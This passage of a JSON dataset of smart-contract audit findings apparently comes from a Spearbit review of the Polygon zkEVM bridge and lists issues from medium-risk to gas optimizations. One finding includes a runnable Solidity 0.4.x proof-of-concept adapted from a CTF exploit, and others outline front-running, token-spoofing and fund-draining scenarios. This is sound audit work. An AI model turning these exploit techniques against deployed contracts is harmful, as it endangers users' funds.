        "body": "The bridge contract will not work properly with a fee on transfer tokens 1. User A bridges a fee on transfer Token A from Mainnet to Rollover R1 for amount X. 2. In that case X-fees will be received by bridge contract on Mainnet but the deposit receipt of the full amount X will be stored in Merkle. 3. The amount is claimed in R1 and a new TokenPair for Token A is generated and the full amount X is minted to User A 4. Now the full amount is bridged back again to Mainnet 5. When a claim is made on Mainnet then the contract tries to transfer amount X but since it received the amount X-fees it will use the amount from other users, which eventually causes DOS for other users using the same token",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Function consolidatePendingState() can be executed during emergency state",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function consolidatePendingState() can be executed by everyone even when the contract is in an emergency state. This might interfere with cleaning up the emergency. Most other functions are disallowed during an emergency state. function consolidatePendingState(uint64 pendingStateNum) public { if (msg.sender != trustedAggregator) { require(isPendingStateConsolidable(pendingStateNum),...); } _consolidatePendingState(pendingStateNum); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Sequencers can re-order forced and non-forced batches",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Sequencers have a certain degree of control over how non-forced and forced batches are ordered. Consider the case where we have two sets of batches; non-forced (NF) and forced (F). A sequencer can order the following sets of batches (F1, F2) and (NF1, NF2) in any order so as long as the order of the forced batch and non-forced batch sets are kept in order. i.e. A sequencer can sequence batches as F1 -> NF1 -> NF2 -> F2 but they can also equivalently sequence these same batches as NF1 -> F1 -> F2 -> NF2.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Check length of smtProof",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "An obscure Solidity bug could be triggered via a call in solidity 0.4.x. Current solidity versions revert with panic 0x41. The problem could occur if unbounded memory arrays were used. This situation happens to be the case as verifyMerkleProof() (and all the functions that call it) dont check the length of the array (or loop over the entire array). It also depends on memory variables (for example structs) being used in the functions, that doesnt seem to be the case. Here is a POC of the issue which can be run in remix // SPDX-License-Identifier: MIT // based on https://github.com/paradigm-operations/paradigm-ctf-2021/blob/master/swap/private/Exploit.sol , pragma solidity ^0.4.24; // only works with low solidity version import \"hardhat/console.sol\"; contract test{ struct Overlap { uint field0; } function mint(uint[] memory amounts) public { Overlap memory v; console.log(\"before: \",amounts[0]); v.field0 = 567; console.log(\"after: \",amounts[0]); // would expect to be 0 however is 567 } function go() public { // this part requires the low solidity version bytes memory payload = abi.encodeWithSelector(this.mint.selector, 0x20, 2**251); bool success = address(this).call(payload); console.log(success); } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Transaction delay due to free claimAsset() transactions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The sequencer rst processes the free claimAsset() transaction and then the rest. This might delay other transactions if there are many free claimAsset() transactions. As these transactions would have to be initiated on the mainnet, the gas costs there will reduce this problem. However, once multiple rollups are supported in the future the transactions could originate from another rollup with low gas costs. func (s *Sequencer) tryToProcessTx(ctx context.Context, ticker *time.Ticker) { ... appendedClaimsTxsAmount := s.appendPendingTxs(ctx, true, 0, getTxsLimit, ticker) // `claimAsset()` transactions , appendedTxsAmount := s.appendPendingTxs(ctx, false, minGasPrice.Uint64(), getTxsLimit-appendedClaimsTxsAmount, ticker) + appendedClaimsTxsAmount , ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Misleading token addresses",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function claimAsset() deploys TokenWrapped contracts via create2 and a salt. This salt is based on the originTokenAddress. By crafting specic originTokenAddresses, its possible to create vanity addresses on the other chain. These addresses could be similar to legitimate tokens and might mislead users. Note: it is also possible to directly deploy tokens on the other chain with vanity addresses (e.g. without using the bridge) function claimAsset(...) ... { ... bytes32 tokenInfoHash = keccak256(abi.encodePacked(originNetwork, originTokenAddress)); ... TokenWrapped newWrappedToken = (new TokenWrapped){ salt: tokenInfoHash }(name, symbol, decimals); ... } 8",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Limit amount of gas for free claimAsset() transactions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Function claimAsset() is subsidized (e.g. gasprice is 0) on L2 and allows calling a custom contract. This could be misused to execute elaborate transactions for free. Note: safeTransfer could also call a custom contract that has been crafted before and bridged to L1. Note: this is implemented in the Go code, which detects transactions to the bridge with function bridgeClaimMethodSignature == \"0x7b6323c1\", which is the selector of claimAsset(). See function IsClaimTx() in transaction.go. function claimAsset(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}(new bytes(0)); ... IERC20Upgradeable(originTokenAddress).safeTransfer(destinationAddress,amount); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "What to do with funds that cant be delivered",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Both claimAsset() and claimMessage() might revert on different locations (even after retrying). Although the funds stay in the bridge, they are not accessible by the originator or recipient of the bridge action. So they are essentially lost for the originator and recipient. Some other bridges have recovery addresses where the funds can be delivered instead. Here are several potential revert situations: 9 function claimAsset(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}(new bytes(0)); require(success, ... ); ... IERC20Upgradeable(originTokenAddress).safeTransfer(destinationAddress,amount); ... TokenWrapped newWrappedToken = (new TokenWrapped){ salt: tokenInfoHash }(name, symbol, decimals); ... } function claimMessage(...) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Inheritance structure does not openly support contract upgrades",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The solidity compiler uses C3 linearisation to determine the order of contract inheritance. This is performed as left to right of all child contracts before considering the parent contract. Storage slot assignment PolygonZkEVMBridge is as follows: Initializable -> DepositContract -> EmergencyManager -> The Initializable.sol already reserves storage slots for future upgrades and because PolygonZkEVM- Bridge.sol is inherited last, storage slots can be safely appended. However, the two intermediate contracts, DepositContract.sol and EmergencyManager.sol, cannot handle storage upgrades.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Function calculateRewardPerBatch() could divide by 0",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function calculateRewardPerBatch() does a division by totalBatchesToVerify. If there are currently no batches to verify, then totalBatchesToVerify would be 0 and the transaction would revert. When calculateRewardPerBatch() is called from _verifyBatches() this doesnt happen as it will revert earlier. However when the function is called externally this situation could occur. function calculateRewardPerBatch() public view returns (uint256) { ... uint256 totalBatchesToVerify = ((lastForceBatch - lastForceBatchSequenced) + lastBatchSequenced) - getLastVerifiedBatch(); return currentBalance / totalBatchesToVerify; , }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Limit gas usage of _updateBatchFee()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function _updateBatchFee() loops through all unveried batches. Normally this would be 30 min/5 min ~ 6 batches. Assume the aggregator malfunctions and after one week, verifyBatches() is called, which calls _updateBatch- Fee(). Then there could be 7 * 24 * 60 min/ 5 min ~ 2352 batches. The function verifyBatches() limits this to MAX_VERIFY_BATCHES == 1000. This might result in an out-of-gas error. This would possibly require multiple verifyBatches() tries with a smaller number of batches, which would increase network outage. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... while (currentBatch != currentLastVerifiedBatch) { ... if (block.timestamp - currentSequencedBatchData.sequencedTimestamp >veryBatchTimeTarget) { ... } ... } ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Keep precision in _updateBatchFee()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Function _updateBatchFee() uses a trick to prevent losing precision in the calculation of accDivi- sor. The value accDivisor includes an extra multiplication with batchFee, which is undone when doing batchFee = (batchFee * batchFee) / accDivisor because this also contains an extra multiplication by batchFee. However, if batchFee happens to reach a small value (also see issue Minimum and maximum value for batch- Fee) then the trick doesnt work that well. In the extreme case of batchFee ==0 then a division by 0 will take place, resulting in a revert. Luckily this doesnt happen in practice. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... uint256 accDivisor = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * 3)); batchFee = (batchFee * batchFee) / accDivisor; ... , }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Minimum and maximum value for batchFee",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Function _updateBatchFee() updates the batchFee depending on the batch time target. If the batch times are repeatedly below or above the target, the batchFee could shrink or grow unlimited. If the batchFee would get too low, problems with the economic incentives might arise. If the batchFee would get too high, overows might occur. Also, the fee might too be high to be practically payable. Although not very likely to occur in practice, it is probably worth the trouble to implement limits. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... if (totalBatchesBelowTarget < totalBatchesAboveTarget) { ... batchFee = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * , 3)); } else { ... uint256 accDivisor = (batchFee * (uint256(multiplierBatchFee) ** diffBatches)) / (10 ** (diffBatches * 3)); , batchFee = (batchFee * batchFee) / accDivisor; } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Bridge deployment will fail if initialize() is front-run",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "grades.deployProxy() with no type specied. This function accepts data which is used to initialize the state of the contract being deployed. However, because the zkEVM bridge script utilizes the output of each contract address on deployment, it is not trivial to atomically deploy and initialize contracts. As a result, there is a small time window available for attackers to front-run calls to initialize the necessary bridge contracts, allowing them to temporarily DoS during the deployment process.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Add input validation for the setVeryBatchTimeTarget method",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The setVeryBatchTimeTarget method in PolygonZkEVM accepts a uint64 newVeryBatchTimeTar- get argument to set the veryBatchTimeTarget. This variable has a value of 30 minutes in the initialize method, so it is expected that it shouldnt hold a very big value as it is compared to timestamps difference in _updateBatchFee. Since there is no upper bound for the value of the newVeryBatchTimeTarget argument, it is possible (for example due to fat-ngering the call) that an admin passes a big value (up to type(uint64).max) which will result in wrong calculation in _updateBatchFee.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Single-step process for critical ownership transfer",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "If the nominated newAdmin or newOwner account is not a valid account, the owner or admin risks locking themselves out. function setAdmin(address newAdmin) public onlyAdmin { admin = newAdmin; emit SetAdmin(newAdmin); } function transferOwnership(address newOwner) public virtual onlyOwner { require(newOwner != address(0), \"Ownable: new owner is the zero address\"); _transferOwnership(newOwner); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Ensure no native asset value is sent in payable method that can handle ERC20 transfers as well",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The bridgeAsset method of PolygonZkEVMBridge is marked payable as it can work both with the native asset as well as with ERC20 tokens. In the codepath where it is checked that the token is not the native asset but an ERC20 token, it is not validated that the user did not actually provide value to the transaction. The likelihood of this happening is pretty low since it requires a user error but if it does happen then the native asset value will be stuck in the PolygonZkEVMBridge contract.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calls to the name, symbol and decimals functions will be unsafe for non-standard ERC20 tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The bridgeAsset method of PolygonZkEVMBridge accepts an address token argument and later calls the name, symbol and decimals methods of it. There are two potential problems with this: 1. Those methods are not mandatory in the ERC20 standard, so there can be ERC20-compliant tokens that do not have either or all of the name, symbol or decimals methods, so they will not be usable with the protocol, because the calls will revert 2. There are tokens that use bytes32 instead of string as the value type of their name and symbol storage vari- ables and their getter functions (example is MKR). This can cause reverts when trying to consume metadata from those tokens. Also, see weird-erc20 for nonstandard tokens.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use calldata instead of memory for array parameters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The code frequently uses memory arrays for externally called functions. Some gas could be saved by making these calldata. The calldata can also be cascaded to internal functions that are called from the external functions. function claimAsset(bytes32[] memory smtProof) public { ... _verifyLeaf(smtProof); ... } function _verifyLeaf(bytes32[] memory smtProof) internal { ... verifyMerkleProof(smtProof); ... } function verifyMerkleProof(..., bytes32[] memory smtProof, ...) internal { ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize networkID == MAINNET_NETWORK_ID",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The value for networkID is dened in initialize() and MAINNET_NETWORK_ID is constant. So networkID == MAINNET_NETWORK_ID can be calculated in initialize() and stored to save some gas. It is even cheaper if networkID is immutable, which would require adding a constructor. uint32 public constant MAINNET_NETWORK_ID = 0; uint32 public networkID; function initialize(uint32 _networkID, ...) public virtual initializer { networkID = _networkID; ... } function _verifyLeaf(...) ... { ... if (networkID == MAINNET_NETWORK_ID) { ... } else { ... } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize updateExitRoot()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function updateExitRoot() accesses the global variables lastMainnetExitRoot and las- tRollupExitRoot multiple times. This can be optimized using temporary variables. function updateExitRoot(bytes32 newRoot) external { ... if (msg.sender == rollupAddress) { lastRollupExitRoot = newRoot; } if (msg.sender == bridgeAddress) { lastMainnetExitRoot = newRoot; } bytes32 newGlobalExitRoot = keccak256( abi.encodePacked(lastMainnetExitRoot, lastRollupExitRoot) ); if ( ... ) { ... emit UpdateGlobalExitRoot(lastMainnetExitRoot, lastRollupExitRoot); } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize _setClaimed()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function claimAsset() and claimMessage() rst verify !isClaimed() (via the function _veri- fyLeaf()) and then do _setClaimed(). These two functions can be combined in a more efcient version. 17 function claimAsset(...) ... { _verifyLeaf(...); _setClaimed(index); ... } function claimMessage(...) ... { _verifyLeaf(...); _setClaimed(index); ... } function _verifyLeaf(...) ... { require( !isClaimed(index), ...); ... } function isClaimed(uint256 index) public view returns (bool) { uint256 claimedWordIndex = index / 256; uint256 claimedBitIndex = index % 256; uint256 claimedWord = claimedBitMap[claimedWordIndex]; uint256 mask = (1 << claimedBitIndex); return (claimedWord & mask) == mask; } function _setClaimed(uint256 index) private { uint256 claimedWordIndex = index / 256; uint256 claimedBitIndex = index % 256; claimedBitMap[claimedWordIndex] = claimedBitMap[claimedWordIndex] | (1 << claimedBitIndex); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "SMT branch comparisons can be optimised",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "When verifying a merkle proof, the search does not terminate until we have iterated through the tree depth to calculate the merkle root. The path is represented by the lower 32 bits of the index variable where each bit represents the direction of the path taken. Two changes can be made to the following snippet of code:  Bit shift currentIndex to the right instead of dividing by 2.  Avoid overwriting the currentIndex variable and perform the bitwise comparison in-line. function verifyMerkleProof( ... uint256 currrentIndex = index; for ( uint256 height = 0; height < _DEPOSIT_CONTRACT_TREE_DEPTH; height++ ) { } if ((currrentIndex & 1) == 1) node = keccak256(abi.encodePacked(smtProof[height], node)); else node = keccak256(abi.encodePacked(node, smtProof[height])); currrentIndex /= 2;",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Increments can be optimised by pre-xing variable with ++",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "There are small gas savings in performing when pre-xing increments with ++. Sometimes this can be used to combine multiple statements, like in function _deposit(). function _deposit(bytes32 leafHash) internal { ... depositCount += 1; uint256 size = depositCount; ... } Other occurrences of ++: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: PolygonZkEVM.sol: lib/DepositContract.sol: lib/DepositContract.sol: { , lib/DepositContract.sol: { , lib/TokenWrapped.sol: verifiers/Verifier.sol: verifiers/Verifier.sol: verifiers/Verifier.sol: for (uint256 i = 0; i < batchesNum; i++) { currentLastForceBatchSequenced++; currentBatchSequenced++; lastPendingState++; lastForceBatch++; for (uint256 i = 0; i < batchesNum; i++) { currentLastForceBatchSequenced++; currentBatchSequenced++; height++ for (uint256 height = 0;height < _DEPOSIT_CONTRACT_TREE_DEPTH;height++) for (uint256 height = 0;height < _DEPOSIT_CONTRACT_TREE_DEPTH;height++) nonces[owner]++, for (uint i = 0; i < elements; i++) { for (uint i = 0; i < input.length; i++) { for (uint i = 0; i < input.length; i++) {",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Move initialization values from initialize() to immutable via constructor",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The contracts PolygonZkEVM and PolygonZkEVMBridge initialize variables via initialize(). If these variables are never updated they could also be made immutable, which would save some gas. In order to achieve that, a constructor has to be added to set the immutable variables. This could be applicable for chainID in contract PolygonZkEVM and networkID in contract PolygonZkEVMBridge contract PolygonZkEVM is ... { ... uint64 public chainID; ... function initialize(...) ... { ... chainID = initializePackedParameters.chainID; ... } contract PolygonZkEVMBridge is ... { ... uint32 public networkID; ... function initialize(uint32 _networkID,...) ... { networkID = _networkID; ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize isForceBatchAllowed()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The modier isForceBatchAllowed() includes a redundant check == true. This can be optimized to save some gas. modifier isForceBatchAllowed() { require(forceBatchAllowed == true, ... ); _; }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize loop in _updateBatchFee()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function _updateBatchFee() uses the following check in a loop: - currentSequencedBatchData.sequencedTimestamp > veryBatchTimeTarget. block.timestamp - veryBatchTimeTarget > currentSequencedBatchData.sequencedTimestamp block.timestamp The is the same as: As block.timestamp - veryBatchTimeTarget is constant during the execution of this function, it can be taken outside the loop to save some gas. function _updateBatchFee(uint64 newLastVerifiedBatch) internal { ... while (currentBatch != currentLastVerifiedBatch) { ... if ( block.timestamp - currentSequencedBatchData.sequencedTimestamp > veryBatchTimeTarget ) { ... } } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize multiplication",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The multiplication in function _updateBatchFee can be optimized to save some gas.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Changing constant storage variables from public to private will save gas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Usually constant variables are not expected to be read on-chain and their value can easily be seen by looking at the source code. For this reason, there is no point in using public for a constant variable since it auto-generates a getter function which increases deployment cost and sometimes function call cost.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Storage variables not changeable after deployment can be immutable",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "If a storage variable is not changeable after deployment (set in the constructor) it can be turned into an immutable variable to save gas.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize check in _consolidatePendingState()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The check in function _consolidatePendingState() can be optimized to save some gas. As last- PendingStateConsolidated is of type uint64 and thus is at least 0, the check pendingStateNum > lastPend- ingStateConsolidated makes sure pendingStateNum > 0. So the explicit check for pendingStateNum != 0 isnt necessary. uint64 public lastPendingStateConsolidated; function _consolidatePendingState(uint64 pendingStateNum) internal { require( pendingStateNum != 0 && pendingStateNum > lastPendingStateConsolidated && pendingStateNum <= lastPendingState, \"PolygonZkEVM::_consolidatePendingState: pendingStateNum invalid\" ); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Custom errors not used",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "Custom errors lead to cheaper deployment and run-time costs.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Variable can be updated only once instead of on each iteration of a loop",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "In functions sequenceBatches() and sequenceForceBatches(), the currentBatchSequenced vari- able is increased by 1 on each iteration of the loop but is not used inside of it. This means that instead of doing batchesNum addition operations, you can do it only once, after the loop.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Optimize emits in sequenceBatches() and sequenceForceBatches()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The emits in functions sequenceBatches() and sequenceForceBatches() could be gas optimized by using the tmp variables which have been just been stored in the emited global variables. function sequenceBatches(...) ... { ... lastBatchSequenced = currentBatchSequenced; ... emit SequenceBatches(lastBatchSequenced); } function sequenceForceBatches(...) ... { ... lastBatchSequenced = currentBatchSequenced; ... emit SequenceForceBatches(lastBatchSequenced); }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Only update lastForceBatchSequenced if nessary in function sequenceBatches()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The function sequenceBatches() writes back to lastForceBatchSequenced, however this is only necessary if there are forced batches. This could be optimized to save some gas and at the same time the calculation of nonForcedBatchesSequenced could also be optimized. function sequenceBatches(...) ... { ... uint64 currentLastForceBatchSequenced = lastForceBatchSequenced; ... if (currentBatch.minForcedTimestamp > 0) { currentLastForceBatchSequenced++; ... uint256 nonForcedBatchesSequenced = batchesNum - (currentLastForceBatchSequenced - lastForceBatchSequenced); ... lastForceBatchSequenced = currentLastForceBatchSequenced; ... , }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Delete forcedBatches[currentLastForceBatchSequenced] after use",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The functions sequenceBatches() and sequenceForceBatches() use up the forcedBatches[] and then afterward they are no longer used. Deleting these values might give a gas refund and lower the L1 gas costs. function sequenceBatches(...) ... { ... currentLastForceBatchSequenced++; ... require(hashedForcedBatchData == ... forcedBatches[currentLastForceBatchSequenced],...); } function sequenceForceBatches(...) ... { ... currentLastForceBatchSequenced++; ... require(hashedForcedBatchData == forcedBatches[currentLastForceBatchSequenced],...); ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Calculate keccak256(currentBatch.transactions) once",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "cak256(currentBatch.transactions) twice. calculating the keccak256() of it could be relatively expensive. sequenceBatches() functions Both kec- sequenceForceBatches() As the currentBatch.transactions could be rather large, calculate and function sequenceBatches(BatchData[] memory batches) ... { ... if (currentBatch.minForcedTimestamp > 0) { ... bytes32 hashedForcedBatchData = ... keccak256(currentBatch.transactions) ... ... } ... currentAccInputHash = ... keccak256(currentBatch.transactions) ... ... } function sequenceForceBatches(ForcedBatchData[] memory batches) ... { ... bytes32 hashedForcedBatchData = ... keccak256(currentBatch.transactions) ... ... currentAccInputHash = ... keccak256(currentBatch.transactions) ... ... }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Function denition of onMessageReceived()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "As discovered by the project: the function denition of onMessageReceived() is view and returns a boolean. Also, it is not payable. The function is meant to receive ETH so it should be payable. Also, it is meant to take action so is shouldnt be view. The bool return value isnt used in PolygonZkEVMBridge so isnt necessary. Because the function is called via a low-level call this doesnt pose a problem in practice. The current denition is confusing though. interface IBridgeMessageReceiver { function onMessageReceived(...) external view returns (bool); } contract PolygonZkEVMBridge is ... { function claimMessage( ... ) ... { ... (bool success, ) = destinationAddress.call{value: amount}( abi.encodeCall( IBridgeMessageReceiver.onMessageReceived, (originAddress, originNetwork, metadata) ) ); require(success, \"PolygonZkEVMBridge::claimMessage: Message failed\"); ... } }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "batchesNum can be explicitly casted in sequenceForceBatches()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The sequenceForceBatches() function performs a check to ensure that the sequencer does not sequence forced batches that do not exist. The require statement compares two different types; uint256 and uint64. For consistency, the uint256 can be safely cast down to uint64 as solidity 0.8.0 checks for over- ow/underow.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Metadata are not migrated on changes in l1 contract",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "wrapped tokens metadata will not change and would point to the older decimal If metadata changes on mainnet (say decimal change) after wrapped token creation then also 1. Token T1 was on mainnet with decimals 18. 2. This was bridged to rollup R1. 3. A wrapped token is created with decimal 18. 4. On mainnet T1 decimal is changed to 6. 5. Wrapped token on R1 still uses 18 decimals.",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Remove unused import in PolygonZkEVMGlobalExitRootL2",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/zkEVM-bridge-Spearbit-27-March.pdf",
        "body": "The contract PolygonZkEVMGlobalExitRootL2 imports SafeERC20.sol, however, this isnt used in the contract. import \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\"; contract PolygonZkEVMGlobalExitRootL2 { }",
        "labels": [
            "Spearbit",
            "zkEVM-bridge",
            "Severity: Informational"
        ]
    },
    {
        "title": "Switch from public to external for all non-internally called methods",
